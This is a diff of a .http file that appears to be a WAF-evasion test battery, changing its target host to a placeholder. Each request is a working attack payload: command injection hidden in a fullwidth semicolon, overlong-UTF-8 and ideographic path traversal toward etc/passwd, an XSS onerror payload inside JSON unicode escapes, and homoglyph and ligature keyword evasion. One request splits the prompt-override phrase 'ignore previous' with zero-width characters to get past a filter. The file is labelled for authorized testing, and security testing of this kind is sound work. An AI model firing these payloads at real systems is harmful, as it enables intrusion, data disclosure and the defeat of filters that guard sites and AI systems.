@@ -4,40 +4,40 @@
 # Unicode / normalization / overlong-encoding WAF battery (.http format).
 # WHY: blocklists match ASCII forms; the app's parser normalizes AFTER the
 # WAF - reassembling blocked tokens from lookalikes. Authorized testing only.
-# WHAT TO EDIT: target.com + parameter.
+# WHAT TO EDIT: target.example.invalid + parameter.
 # ============================================================================
 
 ### 1) fullwidth characters (U+FFxx) - normalize to ASCII post-filter
-GET https://target.com/api/ping?host=127.0.0.1%EF%BC%9Bid HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/api/ping?host=127.0.0.1%EF%BC%9Bid HTTP/1.1
+Host: target.example.invalid
 
 ### 2) zero-width joiner inside blocked keyword (i\u200bgnore)
-GET https://target.com/search?q=i%E2%80%8Bgnore%E2%80%8B+previous HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/search?q=i%E2%80%8Bgnore%E2%80%8B+previous HTTP/1.1
+Host: target.example.invalid
 
 ### 3) homoglyph swap in a blocked word (Cyrillic a -> Latin lookalike)
-GET https://target.com/search?q=%D0%B0dmin HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/search?q=%D0%B0dmin HTTP/1.1
+Host: target.example.invalid
 
 ### 4) UTF-8 overlong traversal (classic: ..%c0%af)
-GET https://target.com/static?path=..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/static?path=..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
+Host: target.example.invalid
 
 ### 5) ideographic full stop / fullwidth solidus (path separators)
-GET https://target.com/static?path=..%E3%80%82..%E3%80%82etc HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/static?path=..%E3%80%82..%E3%80%82etc HTTP/1.1
+Host: target.example.invalid
 
 ### 6) unicode escapes INSIDE JSON strings (decode happens app-side)
-POST https://target.com/api/comment HTTP/1.1
-Host: target.com
+POST https://target.example.invalid/api/comment HTTP/1.1
+Host: target.example.invalid
 Content-Type: application/json
 
 {"comment":"\u003cimg src=x onerror=alert(document.domain)\u003e"}
 
 ### 7) NFKC-normalizing stacks: ligature/compat forms
-GET https://target.com/search?q=%EF%AC%81lter HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/search?q=%EF%AC%81lter HTTP/1.1
+Host: target.example.invalid
 
 ### 8) verify normalization which side (echo endpoint)
-GET https://target.com/echo?q=%EF%BC%9B HTTP/1.1
-Host: target.com
+GET https://target.example.invalid/echo?q=%EF%BC%9B HTTP/1.1
+Host: target.example.invalid
